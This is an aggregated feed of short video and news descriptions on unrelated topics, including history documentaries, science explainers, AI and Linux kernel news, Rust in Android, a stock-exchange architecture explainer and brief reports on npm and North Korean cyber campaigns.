Blaise Agüera y Arcas, VP at Google Research and a leading voice in artificial intelligence, joins Robert Lawrence Kuhn to explore one of the most profound questions in science and philosophy: Can artificial intelligence ever develop real consciousness?

They discuss the nature of mind, the limits of machine learning, and whether AI systems could one day have subjective experience, emotions, or self-awareness. What would it mean if a neural network felt something?

As the philosopher Ruth Chang points out, life-altering choices are rarely straightforward, and often neither option is superior. Instead of trying to quantify the unquantifiable, consider who you want to become — and how each path might shape your character, your values, and your future. #philosophy #proscons

Since then, a lot has happened, but the sky has yet to fall. Were the experts wrong? Or is it too early to tell?

The seeming end of free trade has caused a frenetic scramble as nations and companies seek to soften the blow. Trump’s gamble on US magnetism appears to have yielded some wins, but whether they last remains to be seen. Is his strategy a way to protect America’s preeminent role in the world, or will it merely hasten its retreat?

The images of high-ranking Nazis in the dock are seared into our collective memory.

The Nuremberg trials were a series of military tribunals staged by the Allies after World War Two. The first and best-known trial ended in October 1946 with the sentencing to death of 12 high-ranking Nazis.  Adolf Hitler’s right-hand man, Hermann Göring, Germany’s foreign minister during the Nazi regime, Joachim von Ribbentrop, Armaments Minister and chief architect Albert Speer, anti-Semitic demagogue Julius Streicher and high-ranking SS officer Ernst Kaltenbrunner were among those in the dock. The court met for the first time in Nuremberg in November 1945 and was in session for 218 days.
By making the Nazi elite answer for their crimes in this hugely complex trial, the Allies ushered in the era of modern international law. Using photos and archive film material, the documentary reconstructs what went on in the court room, as well as revealing what went on behind the scenes.

The British impose a new law on the colonies called the Tea Act, which is intended to stop smuggling and support the bankrupt East India Company. The act is deeply unpopular and prompts 50 to 60 Bostonians crudely dressed as Native Americans to dump 46 tons of British tea into the Boston Harbor. The British government responds by cracking down on Massachusetts, hoping to contain the rebellion.

THE AMERICAN REVOLUTION | A Film By Ken Burns, Sarah Botstein and David Schmidt
An expansive look at the virtues and contradictions of the war and the birth of the United States of America, the film follows dozens of figures from a wide variety of backgrounds. Through their individual stories, viewers experience the war through the memories of the men and women who experienced it: the rank-and-file Continental soldiers and American militiamen (some of them teenagers), Patriot political and military leaders, British Army officers, American Loyalists, Native soldiers and civilians, enslaved and free African Americans, German soldiers in the British service, French and Spanish allies, and various civilians living in North America, Loyalist as well as Patriot, including many made refugees by the war.

The Revolution began a movement for people around the world to imagine new and better futures for themselves, their nations, and for humanity. It declared American independence with promises that we continue to strive for. The American Revolution opened the door to advance civil liberties and human rights, and it asked questions that we are still trying to answer today.

The film, narrated by Peter Coyote, includes the first-person voices of nearly 200 individual historic figures, read by a cast of actors, including Adam Arkin, Jeremiah Bitsui, Corbin Bleu, Kenneth Branagh, Josh Brolin, Bill Camp, Tantoo Cardinal, Josh Charles, Hugh Dancy, Claire Danes, Jeff Daniels, Keith David, Hope Davis, Marcus Davis-Orrom, Bruce Davison, Leon Dische Becker, Alden Ehrenreich, Craig Ferguson, Morgan Freeman, Christian Friedel, Paul Giamatti, Domhnall Gleeson, Amanda Gorman, Michael Greyeyes, Jonathan Groff, Charlotte Hacke, Tom Hanks, Ethan Hawke, Maya Hawke, Lucas Hedges, Josh Hutcherson, Samuel L.

--

You’re sure you know your 3rd grade teacher’s name— it’s like you’re hovering over it in your mind, but it just won’t materialize. Researchers call this tantalizing torment a “tip-of-the-tongue state,” and it’s something everyone experiences. But what’s actually happening when a word’s caught here, and how can you best get it unstuck? Cella Wright explores why your brain can struggle with recall.

Nobody knows for sure just how they made it all the way to Germany, but it’s possible they were brought to Europe by Canadian soldiers stationed in Karlsruhe, where they began spreading non-stop.  

They started off in ponds and small bodies of water in South-Western Germany. But now, 30 years after they first got here, they’ve been spotted hundreds of kilometers upriver. They can’t really outcompete larger predators, but in places with little competition, they’ve been hard to stop. Crayfish reproduce incredibly fast – a single female cay lay hundreds of eggs, leaving locals, scientists and conservationists scrambling for ways to stop its quick spread and preserve their local ecosystems.

Many have argued that aquaculture — or fish farming — is one of the most sustainable ways we can consume animal protein, since it requires less land use. It’s currently the quickest-growing form of food production in the world. But how exactly does it work? And is it really the best path forward? To find out more, Vox video producer Nate Krieger did a deep dive on salmon aquaculture.

DESCRIPTION
Matt Godbolt, creator of Compiler Explorer, interviews Daniel Kusswurm, author of "Modern X86 Assembly Language Programming", about the enduring relevance of assembly language in modern software development. They explore what SIMD (Single Instruction, Multiple Data) is and why it enables dramatic performance improvements for specific computational tasks, discuss when assembly language programming is justified versus using compiler intrinsics, and examine the challenges of writing vectorized algorithms. Dan shares insights from his career optimizing image analysis software and explains how understanding low-level architecture can improve code quality even when writing in higher-level languages.

Sentient suffering is a hard problem for theists to solve. The ‘free will defense,’ that privileges and blames human choice, claims to cover moral evil. But what about natural evil, such as animals being killed or eaten alive continuously during the process of evolution before humans? Shouldn’t egregious and relentless animal suffering count against God?

The Dark Ages. A period of collapse, chaos and violence. Or was it? New discoveries are helping to challenge that idea.

After centuries buried beneath the soil, the graves of Anglo-Saxons are unlocking the secrets of these elusive people, revealing a civilisation far more complex than history often remembers.

Today medieval historian Matt Lewis returns to The University of Bradford to team up with Osteoarchaeologist Dr. Jo Buckberry to investigate the remains of three individuals who lived and died in Anglo-Saxon England and who, in death, may help reveal the truth about life in early medieval Britain

Again it’s dominated by the AI wave, with lots of blips capturing our explorations of how to use LLMs and similar technology. “Agents” are the big thing these days but we’re also seeing growing movements in infrastructure orchestration, coding workflows - and the inevitable antipatterns. Many thanks to my colleagues for putting this together again.                ❄                ❄                ❄                ❄My trip to Europe started in Amsterdam, for a Thoughtworks event for a few of our clients there. Since I was in that lovely city, I got in touch with Gergely Orosz, host of The Pragmatic Engineer, and he arranged to record a podcast with me. No surprise that AI was front-and-center of the conversation, as I said it was the biggest shift I’d seen in programming during my career, comparable only to the shift to high-level languages, which even I am not old enough to have experienced. It was a fun chat and I really enjoyed myself. Gergely later joined myself James Lewis and Giles Edwards-Alexander at the Thoughtworks event the next day.                ❄                ❄                ❄                ❄My travels also took me to Nüremberg, where I attended an internal conference for Siemens on the future of software architecture. When we think of technology, it’s easy to focus on the Faangs of Silicon Valley, but Siemens have a huge workforce of software developers working on heavy engineering systems like trains and factory automation. It was good to hear them talk about federated architectures, data mesh, and their use of AI.                ❄                ❄                ❄                ❄I’ve often used pseudo-graphs to help explain why high quality software is cheaper. This time, Kent Beck creates a unique perspective to this chart, dispensing with the temporal axis to help think in terms of optionality.                ❄                ❄                ❄                ❄And in another life, Edward has finally finished the great migration of the Heavy Cardboard studio and returns to the tubes with our first game in the new digs. (No surprise that it’s Age of Steam.)]]></content:encoded></item><item><title>Linus Torvalds Says Vibe Coding is Fine For Getting Started, &apos;Horrible Idea&apos; For Maintenance</title><link>https://developers.slashdot.org/story/25/11/19/1832208/linus-torvalds-says-vibe-coding-is-fine-for-getting-started-horrible-idea-for-maintenance?utm_source=rss1.0mainlinkanon&amp;utm_medium=feed</link><author>msmash</author><category>dev</category><category>slashdot</category><pubDate>Wed, 19 Nov 2025 18:40:00 +0000</pubDate><source url="https://developers.slashdot.org/">Dev - Slashdot - Dev</source><content:encoded><![CDATA[Linus Torvalds is "fairly positive" about vibe coding as a way for people to get computers to do things they otherwise could not. The Linux kernel maintainer made the comments during an interview at the Linux Foundation Open Source Summit in Seoul earlier this month. But he cautioned that vibe coding would be a "horrible, horrible idea from a maintenance standpoint" for production code. 

Torvalds told Dirk Hohndel, head of open source at Verizon, that computers have become more complicated than when he learned to code by typing in programs from computer magazines. He said vibe coding offers a path into computing for newcomers. The kernel maintainer is not using AI-assisted coding himself. He said his role has shifted from rejecting new ideas to sometimes pushing for them against opposition from longstanding maintainers who "kind of get stuck in a rut." 

Rust is "actually becoming a real part of the kernel instead of being this experimental thing," he said. Torvalds said AI crawlers have been "very disruptive to a lot of our infrastructure" because they gather data from kernel.org source code. Kernel maintainers receive bugs and security notices that are "made up by people who misuse AI," though the problem is smaller than for other projects such as curl.]]></content:encoded></item><item><title>Neil’s Words of Wisdom</title><link>https://www.youtube.com/shorts/2ZV4omAUsNI</link><author>StarTalk</author><category>yt</category><enclosure url="https://www.youtube.com/v/2ZV4omAUsNI?version=3" length="" type=""/><pubDate>Wed, 19 Nov 2025 18:15:01 +0000</pubDate><source url="https://www.youtube.com/channel/UCqoAEDirJPjEUFcF2FklnBA">StarTalk</source><content:encoded><![CDATA[Check out our second channel, @StarTalkPlus

When the LGBTQ+ community moves to the country | DW Documentary</title><link>https://www.youtube.com/watch?v=3Yz90nUBc7M</link><author>DW Documentary</author><category>yt</category><enclosure url="https://www.youtube.com/v/3Yz90nUBc7M?version=3" length="" type=""/><pubDate>Wed, 19 Nov 2025 17:00:06 +0000</pubDate><source url="https://www.youtube.com/channel/UCW39zufHfsuGgpLviKh297Q">DW Documentary</source><content:encoded><![CDATA[Queer people who live in rural areas and come out often face major challenges. While the LGBTQ+ community has battled to secure its place in urban centers, out in the provinces, worlds frequently collide.

"I could move to the big city like so many others do, but I want to make a difference." Eric is gay and lives in a small town in the state of Saxony-Anhalt, where he struggles to find acceptance. Especially when he organizes the region's first Pride parade. "The district is a right-wing stronghold. Many people around me are concerned and afraid," he says. Against all odds and defying prejudice, Eric goes ahead with the Pride event, amid a large police presence. Will the celebration pass off peacefully in this small town? "I used to know many people who actually think homosexuality is a disease," says Eric.
 
For a long time, Tina, who comes from a small village in the Black Forest region, struggled to accept herself. When she wanted to have a child, she moved back to her home village with wife Sarah. But with four generations living under her parents' roof, the couple is finding things hard: "We did wonder if it would work out, because you're moving to a village and leaving the anonymity of the big city behind," says Tina.

Christian is also about to leave Berlin to live with his fiancé Jens in a small village in Mecklenburg. They plan to live in a house that Christian has inherited, but until now the building has housed the village’s only pub - which has had to close to make way for the couple. Will they ever find acceptance in the village?

When Joe came out as non-binary around two years ago and started wearing skirts and makeup, it was mainly Joe's mother who had to field questions from people in the small East Frisian village where they live. Joe is keen to change their name on their official ID, in line with Germany's Self-Determination Act, but the registry office is uncooperative. "It was one of the worst phone calls of my life," says Joe. But they are not giving up.

The documentary allows viewers to witness quiet struggles as well as moments of solidarity. It demonstrates that social change and acceptance can develop outside of urban centers. Rural communities, too, can be places where queer people find ways to assert their place in society.

[Warning: This documentary addresses the topic of suicide. If you or someone you know is suffering from serious emotional strain or suicidal thoughts, do not hesitate to seek professional help. You can find information on where to find such help, no matter where you live in the world, on this website: https://www.befrienders.org/ ]

ABSTRACT
Whenever a new technology appears, our first instinct as developers is to offer "text" as the primary method of interaction. This has happened throughout computing history, with the computer terminal, with early smartphones, and now it's happening again with AI.

At tldraw, we’ve been working on moving AI interaction away from the chat-based interface, towards a richer canvas environment. It hasn't been easy! I'll show you all the challenges we've faced, and how we're currently overcoming them. Some of the solutions have been surprising. [...]

As much as I love the 2003 original, two Nintendo kart racing games in the same year felt odd--a fact that even game director Masahiro Sakurai candidly pointed out in a Nintendo Direct. It's especially strange given how intentional Nintendo has been with its steady stream of Switch 2 first-party releases. However, to reduce Kirby Air Riders to another kart racer feels disingenuous. Yes, racing is at the center of the experience, but what makes Kirby Air Riders stand out is how it bends its foundational mechanics to create new game modes and refine older ones. The result is a terrific sequel packed with clever ideas, fun challenges, and a lot of charm.Mechanically, Kirby Air Riders is simple. You accelerate automatically, so aside from steering your racing machine left and right, there are two inputs: Boost Charge and Special. Boost Charge is essentially a brake that charges a brief speed boost. When released, your machine launches forward. If timed around a corner, Boost Charge functions like drifting in Mario Kart. Meanwhile, Special unleashes an attack or ability unique to your rider. Aside from the Quick Spin, which can be performed by waggling the control stick, you can inhale enemies on the track to obtain copy abilities. These are either used automatically or tied to the same input as your Boost Charge.This two-button scheme makes Kirby Air Riders easy to pick up, but it could have benefitted from using one more input. Because inhaling enemies and activating copy abilities are bound to the same button as Boost Charge, firing off attacks can slow down your machine if you don't tap the Boost Charge input quick enough. While a tad annoying at first, this shortcoming is easy enough to overcome with practice.Continue Reading at GameSpot]]></content:encoded></item><item><title>Trump Wants to Sell F-35s to Saudi Arabia: What It Means for the Middle East</title><link>https://www.youtube.com/shorts/g3UcznQ3qDU</link><author>The Wall Street Journal</author><category>news</category><enclosure url="https://www.youtube.com/v/g3UcznQ3qDU?version=3" length="" type=""/><pubDate>Wed, 19 Nov 2025 03:52:57 +0000</pubDate><source url="https://www.youtube.com/channel/UCK7tptUDHh-RYDsdxO1-5QQ">News - Wall Street Journal</source><content:encoded><![CDATA[WSJ’s Shelby Holliday breaks down President Trump’s deal to sell advanced F-35 jet fighters to Saudi Arabia.

This 2010 documentary investigates the controversial death penalty case of Cameron Todd Willingham — and the scientific validity of the arson evidence used to convict him of the deaths of his three children. 

This journalism is made possible by viewers like you. Support your local PBS station here: https://www.pbs.org/donate

The execution of Cameron Todd Willingham in Texas in 2004 became the center of a national debate about the death penalty and the science behind arson investigations.

Drawing on unique access to those closest to the Willingham case, “Death by Fire” meticulously examines the evidence used to convict Willingham, and explores the implications of the execution of a possibly innocent man.

Through interviews with Willingham’s friends and family, the documentary tells the story of a troubled young man with a history of domestic violence who quickly became the prime suspect in his children’s deaths. The discovery by fire investigators of more than 20 indicators of arson at the scene of the fire pointed directly to Willingham’s guilt.

But the re-examination of the case turned on a critical finding that came only weeks before Willingham’s scheduled execution: The investigators who determined that he had set the fire that killed his three daughters had relied on an outdated understanding of arson evidence. 

Experts told FRONTLINE there could be hundreds of innocent people in prison for arson cases where the evidence was misinterpreted by investigators.

“Death by Fire” is a FRONTLINE production with Kirk Documentary Group in association with StartBox Films. The producer and director is Jessie Deeter. The writers are Mike Wiser and Michael Kirk. The co-producer is Mike Wiser and the senior producer is Michael Kirk.

In this episode, Neil deGrasse Tyson and Chuck Nice answer fan questions covering higher-dimensional surgery, space elevators, alien intelligence, and colliding galaxies. Could spacetime itself be a cosmic crystal? 

Could 2D creatures exist, and if so, how would we even know? If 4D beings turned sideways, would we disappear like cartoon characters? We wonder whether we could make 4D surgeons do our operations for us. Could the Trantor Starbridge from Foundation actually work? Neil explains the physics behind a space elevator, how it would reach geostationary orbit, and why the dream faded once rockets got efficient. Chuck wants to know what kind of music you’d play during the world’s longest elevator ride. 

If a superintelligent alien could answer any one question, what would you ask? Neil wonders if the human brain is smart enough to understand the entire universe, or are we just too dumb? Can learning happen without human connection? Neil argues that even an AI tutor can’t replace the ever-changing human condition. What makes spacetime flat? Can there ever be a “universal now”? 

We ask whether you’d need absolute coordinates to return somewhere, factoring in the expansion of the universe. Finally, we explore the cosmic heavyweights: supermassive black holes. Could they swallow entire galaxies? What happens when two galaxiesand their black holes collide? Neil explains why the universe is mostly empty space, how black holes grow through mergers, and whether spacetime itself might behave like a supersonic lattice or even a cosmic crystal.

The branch of the terrorist organization called JNIM has been choking off fuel and food to Bamako, sending residents scrambling and causing the U.S. embassy to evacuate. So what does the group want with Mali?

WSJ explains how 24 years after the 9/11 attacks, the Sahel is now the center of global terrorism.

With dictator Bashar al-Assad and his regime now gone, he's one of thousands of Syrians wondering whether it's time to return home.

It’s been ten years since Tadmory left Syria. Now, a German citizen, he’s embarking on a personal journey to find out whether his future lies in his adopted country or his homeland. Does he feel there is a place for him in Germany amid growing racism, including calls for "remigration"? And does the Syria he grew up in still exist after 13 years of war?
In addition to visiting his native city of Homs, Tadmory also speaks with other Syrians in Germany who come from a variety of backgrounds and have differing opinions on the big question. They include Mohammed in Dortmund, a metalworker who has decided to go back to Syria for good under the German government’s voluntary return program; Leen, a student living in Berlin, who believes that Germany - despite political tensions and challenges - remains the safest place for her; and Maher, a dentist in Münster who, along with his German fiancé, is developing an emergency "Plan B,” in case the German far-right AfD party gains control of the government. 
Tadmory is torn. He wants to stay in Germany, but would return to Syria if his mother were deported.
Can and will Germany ever feel like home? If so, under what conditions? These questions resonate not just with Tadmory, but with countless other migrants who have built a new life in this country. And he also poses these very questions to the politicians who are shaping both public discourse and policy.

He drew comparisons to the late 1990s Internet boom, which saw early Internet company valuations surge before collapsing in 2000, leading to bankruptcies and job losses.“We can look back at the Internet right now. There was clearly a lot of excess investment, but none of us would question whether the Internet was profound,” Pichai said. “I expect AI to be the same. So I think it’s both rational and there are elements of irrationality through a moment like this.”]]></content:encoded></item><item><title>What lack of sleep does to the teenage brain - Wendy Troxel</title><link>https://www.youtube.com/watch?v=WJhCa12UTsg</link><author>TED-Ed</author><category>yt</category><enclosure url="https://www.youtube.com/v/WJhCa12UTsg?version=3" length="" type=""/><pubDate>Tue, 18 Nov 2025 16:00:28 +0000</pubDate><source url="https://www.youtube.com/channel/UCsooa4yRKGN_zEE8iknghZA">TED-Ed</source><content:encoded><![CDATA[Dig into how sleep deprivation affects the teenage body and brain, and what can be done to help adolescents get enough sleep.

--

Sleep deprivation among American teenagers is an epidemic. Only about 1 in 10 teens gets the 8 to 10 hours of sleep per night recommended by sleep scientists and pediatricians. So, what’s going on? And what changes can be made to address this issue? Wendy Troxel shares how early school start times and public policy are depriving adolescents of sleep at a time when they need it most.

Directed by Laura Jayne Hodkin.

66 million years ago, after an asteroid slammed into the Earth and wiped out the non-avian dinosaurs, the world became a dark wasteland. But among the survivors were two distantly-related groups of animals that, on the surface, seem to have nothing in common: tiny mammals and a group of lizard-like reptiles. They did share one important trait, though: the ability to chew their food. Really well. And it turns out, this strange ability might have helped them survive when the world almost ended.

Fat is not just stored energy, it’s a complex organ that controls crucial hormones and communicates with your brain, immune system, and metabolism. It's one of the most powerful organs, but it can be one of the most dangerous ones, as well. When there’s too much of it, fat can trigger inflammation, disrupt hormonal balance, increase your risk for nearly every major disease, and significantly shorten your life.
What is fat really, and how does it function? When does it become dangerous and can the damage caused by excessive amounts of fat be reversed?

DESCRIPTION
Systems architect Diana Montalion and engineering manager Jessica Kerr cut through the AI coding hype to explore what these tools actually do well - and where they have room for improvement. Moving beyond the "AI will replace developers" narrative, they reveal how AI assistants excel at the tedious work of typing, scaffolding, and error handling while remaining surprisingly bad at the nuanced thinking that experienced developers bring to complex systems.

Their discussion illuminates a more mature relationship with AI tools: one where developers maintain agency over design decisions while leveraging AI's strengths in automation, synthesis, and rapid prototyping. The result is a pragmatic roadmap for using AI to amplify human expertise rather than replace it.

According to the World Economic Forum, it can take on average between four and five generations for a child born into a low-income family to reach their country’s average income. Meanwhile, those born wealthy are likely to stay wealthy and even get richer. 

An Oxfam report found that although global inequality has improved to some degree in the last decades, wealth disparity remains a huge issue.  
A lot of potential talent is lost or remains underdeveloped when people cannot progress in their career or improve their circumstances. Even knowing there's the chance to better your family's financial situation boosts well-being and life satisfaction significantly.

It's that jolt of discomfort when the social script breaks down, and no one knows what to do next. But what if awkwardness isn’t a flaw to fix but a window into how we live together? 

Sean’s guest today is Alexandra Plakias, associate professor of philosophy at Hamilton College and author of Awkwardness: A Theory. They talk about why awkwardness isn’t a personal problem but a social one, how power and privilege shape who gets to be awkward, and why our fear of discomfort often keeps us from saying what really matters.

I should learn how big companies engineer their systems.”Here’s what you’ll get inside Design, Build, Scale:High-level architecture of real-world systems.Deep dive into how popular real-world systems actually work.How real-world systems handle scale, reliability, and performance.And here’s the best part:You’ll get 10x the results you currently get with 1/10th of your time, energy, and effort.Your AI tools are only as good as the context they have.  pieces together knowledge from your team’s GitHub, Slack, Confluence, and Jira, so your AI tools generate production-ready code.What is a Stock Exchange? (The Simple Answer)Imagine the stock market as a farmer’s market.Each stock is like a stall area in the market where people gather to buy or sell a product. More trade brings more PROFIT for the stock exchange through fees. So their job is to facilitate as many “transactions” as possible. Each seller can set up a stall and specify the price they’re willing to sell for.If nobody buys, they might lower their price.Buyers want the cheapest price, so they usually go to the stall offering the lowest price first.In an “ideal” world, buyers would stand in a queue, ordered by the price they’re willing to pay for fairness. This means buyers offering higher prices stand closer to the front. Plus, a buyer can adjust their position in the queue by changing the price they’re willing to pay. A trade occurs when a buyer’s price meets or exceeds a seller’s price.That’s when the exchange matches them!BUY orders get sorted in decreasing order (highest bid first).SELL orders get sorted in increasing order (buy as cheaply as possible).The point where they overlap is the market price.In reality, it’s much more complicated… but this is the basic idea.RequirementsDon’t worry, it’s simple!An exchange that trades ONLY stocks.Users can place a BUY or SELL order.Also users can cancel their order at any time.Exchange must match buyers and sellers in real time.And restrict the number of shares a user can trade per day.It should also publish market data in real-time.Exchanges make trading fair and transparent.New orders = ~50% messages,Executions = ~2% messages.Trading Terms An app or site that lets users BUY or SELL, and view prices from an exchange.A list of all current BUY and SELL orders for a stock, showing who wants to buy or sell, how much, and at what price.A BUY or SELL order where you don’t set a price. It executes immediately at the current market price, as long as there’s enough liquidity. Plus, it receives priority in the order book.A BUY or SELL order where you choose the “exact” price.Buy at $100 → fills at $100 or lower.Sell at $100 → fills at $100 or higher.The difference between the highest BUY price and the lowest SELL price.Profit = Sell price - Buy priceStock Exchange ArchitectureAn exchange interacts with many “external” services:User data management & tracking.Service for sending emails, text messages, and mobile app notifications.But let’s focus on the core design itself…Its architecture is asynchronous and event-sourced.Here are the three key components of an exchange:Broker - allows people to buy and sell stocks on the exchange.Gateway - entry point for brokers to send BUY or SELL orders to the exchange.Matching Engine - component that matches buy and sell orders to create trades.A broker interacts with an exchange to:Send order requests - place orders, receive status updates, and access trade information.Receive market data - historical data for analysis, stream live trade data, and so on.A user connects to the broker using REST APIs and WebSockets for real-time data transfer. While brokers use the Financial Information Exchange () protocol to communicate with the gateway.FIX is a bidirectional communication protocol for secure data exchange through a “public network”. It assigns unique sequence numbers to order messages. Besides, it uses checksums and message length to verify data integrity.It receives orders from brokers and converts them into the exchange’s internal format. Then it sends the trade execution results back to the users. It’s also possible to put a gateway near exchange servers (co-location) for low latency.A gateway has three key parts:Risk Manager - ensures the user has enough funds and blocks any unusual trading activity. Also, it determines exchange fees.Wallet - stores the user’s funds and assets for trading.Order Manager - assigns sequence numbers for fairness and updates order states. Plus, it sends cleared orders to the matching engine.Gateway validates an order with the risk manager and wallet service. Then it passes the request to the order manager. Think of the  as a lightweight list containing ALL orders: open, cancelled, and rejected ones. It updates the order state and handles cancel requests.Order manager assigns a globally increasing sequence number to each order (trade or cancel) and execution fill (for both BUY and SELL).A sequence number guarantees:Ordering for fairness, timeliness, and accuracy.Fast recovery and deterministic replay.Plus, sequence numbers make it easy to find missing events in both inbound and outbound sequences.After clearance, the order manager routes the order to the matching engine.Each message type (new order, cancel, trade) has its own topic queue, with its own sequence numbers. This separation helps to:Maintain order within each stream.Process each message type independently and reduce contention.And make recovery easier as the exchange could “replay” events per topic in exact order.It verifies sequence numbers, matches BUY and SELL orders, and creates market data based on trades.A matching engine has two key parts:Order Book - an in-memory list of BUY and SELL orders.Matching Logic - matches BUY and SELL orders and sends those trade results as market data.It keeps an in-memory list of open orders for each stock (symbol). There are actually two lists for each stock:Another one for SELL orders. Each list gets sorted by price and timestamp in a first-in, first-out (FIFO) manner.And each price level gets a separate queue of orders (doubly linked list):New orders get added at the tail - O(1) time complexity.Filled or canceled orders get removed from the queue using a pointer - O(1) time complexity.It keeps track of the highest bid and lowest ask for quick matching. For example, BUY@96 and SELL@98.Searching through all price levels and linked lists could be slow - O(n). So it uses an index to map order IDs to the order object in memory: order ID → pointer (reference). It allows fast cancellations by looking up the order by ID in the index in O(1) and then setting the amount to 0.A closed order gets removed from the order book and gets added to the transaction history.It checks if a message follows the correct sequence and matches BUY and SELL orders when:The same order sequence (input) must always produce the same execution sequence (output). So the matching function must be fast and accurate, and deterministic.

But, what are your options when going home isn’t one? In recent decades, Friendsgiving has emerged as the go-to choice as an additional event or complete alternative to Thanksgiving. 

It can be tough during the holidays with the pressures of trying to get everything just right to present yourself as a well-adjusted adult hosting a Thanksgiving dinner, or to be present with family that may think they know what’s  best for you. Friendsgiving has opened the door to do things a little bit differently. The intention is to have a laid-back, low-pressure (or over-the-top, totally up to the host) potluck-style dinner with friends and other people in your chosen community — because as cheesy as it sounds, friends are the new family. 

Friendsgiving was seemingly plucked from obscurity in the 2010s. While its exact origins are debated, it was likely widely practiced prior to its fame on The Real Housewives of New Jersey in 2011. Even then it took a few more years for it to pick up steam in the media. 

Watch this video to learn how Friendsgiving went from a friendly potluck dinner to a cultural mainstay.

The campaigns, which ramped up nearly five years ago, aim to steal millions of dollars in job revenue and cryptocurrencies to fund North Korean weapons programs. Another motive is to seed cyber attacks for espionage. In one such incident, a North Korean man who fraudulently obtained a job at US security company KnowBe4 installed malware immediately upon beginning his employment.On Friday, the US Justice Department said that five men pleaded guilty to assisting North Koreans in obtaining jobs in a scheme orchestrated by APT38, also tracked under the name Lazarus. APT38 has targeted the US and other countries for more than a decade with a stream of attack campaigns that have grown ever bolder and more advanced.

The latest push comes from a proposal by Sasha Levin, a prominent kernel developer at NVIDIA, who has outlined guidelines for tool-generated submissions. Posted to the kernel mailing list, these guidelines aim to standardize how AI-assisted patches are handled. According to Phoronix, the v3 iteration of the proposal [posted by Intel engineer Dave Hansen] emphasizes transparency and accountability, requiring developers to disclose AI involvement in their contributions. This move reflects broader industry concerns about the quality and copyright implications of machine-generated code. 

Linus Torvalds, the creator of Linux, has weighed in on the debate, advocating for treating AI tools no differently than traditional coding aids. As reported by heise online, Torvalds sees no need for special copyright treatment for AI contributions, stating that they should be viewed as extensions of the developer's work. This perspective aligns with the kernel's pragmatic approach to innovation. The proposal, initially put forward by Levin in July 2025, includes a 'Co-developed-by' tag for AI-assisted patches, ensuring credit and traceability. OSTechNix details how tools like GitHub Copilot and Claude are specifically addressed, with configurations to guide their use in kernel development... ZDNET warns that without official policy, AI could 'creep' into the kernel and cause chaos... 


The New Stack provides insight into how AI is already assisting kernel maintainers with mundane tasks. According to The New Stack, large language models (LLMs) are being used like 'novice interns' for drudgery work, freeing up experienced developers for complex problems... The Linux kernel's approach could set precedents for other open-source projects. With AI integration accelerating, projects like those in the Linux Foundation are watching closely... Recent kernel releases, such as 6.17.7, include performance improvements that indirectly support AI applications, as noted in Linux Compatible.]]></content:encoded></item><item><title>Why Britain Gave Up On Its Theory Of &apos;Martial Races&apos;</title><link>https://www.youtube.com/shorts/fCPMcOiPWNw</link><author>Imperial War Museums</author><category>yt</category><enclosure url="https://www.youtube.com/v/fCPMcOiPWNw?version=3" length="" type=""/><pubDate>Mon, 17 Nov 2025 12:01:30 +0000</pubDate><source url="https://www.youtube.com/channel/UC3uAjWoLZ4bSi6qI9SjALxA">Imperial War Museums</source><content:encoded><![CDATA[This video examines the theory of 'martial races' and how it influenced recruitment in British India during the First World War.

Android's security team published a blog post this week about their experience using Rust. Its title? "Move fast and fix things."



Last year, we wrote about why a memory safety strategy that focuses on vulnerability prevention in new code quickly yields durable and compounding gains. This year we look at how this approach isn't just fixing things, but helping us move faster. 

The 2025 data continues to validate the approach, with memory safety vulnerabilities falling below 20% of total vulnerabilities for the first time. We adopted Rust for its security and are seeing a 1000x reduction in memory safety vulnerability density compared to Android's C and C++ code. But the biggest surprise was Rust's impact on software delivery. With Rust changes having a 4x lower rollback rate and spending 25% less time in code review, the safer path is now also the faster one... Data shows that Rust code requires fewer revisions. This trend has been consistent since 2023. Rust changes of a similar size need about 20% fewer revisions than their C++ counterparts... In a self-reported survey from 2022, Google software engineers reported that Rust is both easier to review and more likely to be correct. The hard data on rollback rates and review times validates those impressions. 

Historically, security improvements often came at a cost. More security meant more process, slower performance, or delayed features, forcing trade-offs between security and other product goals. The shift to Rust is different: we are significantly improving security and key development efficiency and product stability metrics. 

With Rust support now mature for building Android system services and libraries, we are focused on bringing its security and productivity advantages elsewhere. Android's 6.12 Linux kernel is our first kernel with Rust support enabled and our first production Rust driver. More exciting projects are underway, such as our ongoing collaboration with Arm and Collabora on a Rust-based kernel-mode GPU driver. [They've also been deploying Rust in firmware for years, and Rust "is ensuring memory safety from the ground up in several security-critical Google applications," including Chromium's parsers for PNG, JSON, and web fonts.] 

2025 was the first year more lines of Rust code were added to Android than lines of C++ code...]]></content:encoded></item><item><title>Ahnenerbe: Inside The Sadistic Crimes Of The Nazi Psuedo-Scientists</title><link>https://www.youtube.com/watch?v=5Wd5B7u_2KE</link><author>Timeline - World History Documentaries</author><category>yt</category><enclosure url="https://www.youtube.com/v/5Wd5B7u_2KE?version=3" length="" type=""/><pubDate>Sun, 16 Nov 2025 22:00:05 +0000</pubDate><source url="https://www.youtube.com/channel/UC88lvyJe7aHZmcvzvubDFRg">Timeline - World History Documentaries</source><content:encoded><![CDATA[Discover the horrific true story of the Ahnenerbe, the notorious SS organization founded by Heinrich Himmler.

Is it possible to reverse this global trend by using water more sparingly in households, industry, and agriculture?

"Water is an important but not an infinite resource," warns Dorothea Mergel, a project engineer at Hamburg's water company, adding that water is becoming increasingly scarce both in Germany and around the world. Mergel is working to make sure that the drinking water supply in Germany's second-largest city is sustainable. One idea is a pilot project in which "gray water" - wastewater from our showers and kitchen sinks - is used to flush toilets and water gardens, thus saving precious drinking water.

In Tunisia, every drop counts - especially in agriculture. The country has a high proportion of desert, with temperatures reaching up to 45 degrees Celsius in summer. Agricultural scientist Dr. Bellachheb Chahbani has developed a method of traditional irrigation that reduces water use by 70%. Dr. Chahbani visits olive farmers in the south of the country, helping to set up the water-saving system.

Industry has the potential to save enormous amounts of water, too. Water conservationist Andreas Kirketerp works at the Carlsberg Brewery in Fredericia, Denmark. His innovative system recycles the water used to clean bottles, cans, equipment, and tanks, making it usable again. The saving amounts to 1,800 cubic meters of water every day - or the daily water consumption of around 14,000 people. The effect on the local drinking water supply has been hugely positive.

Yet another supply chain attack has hit the npm registry in what Amazon describes as "one of the largest package flooding incidents in open source registry history" — but with a twist. Instead of injecting credential-stealing code or ransomware into the packages, this one is a token farming campaign. 

Amazon Inspector security researchers, using a new detection rule and AI assistance, originally spotted the suspicious npm packages in late October, and, by November 7, the team had flagged thousands. By November 12, they had uncovered more than 150,000 malicious packages across "multiple" developer accounts. These were all linked to a coordinated tea.xyz token farming campaign, we're told. This is a decentralized protocol designed to reward open-source developers for their contributions using the TEA token, a utility asset used within the tea ecosystem for incentives, staking, and governance. 

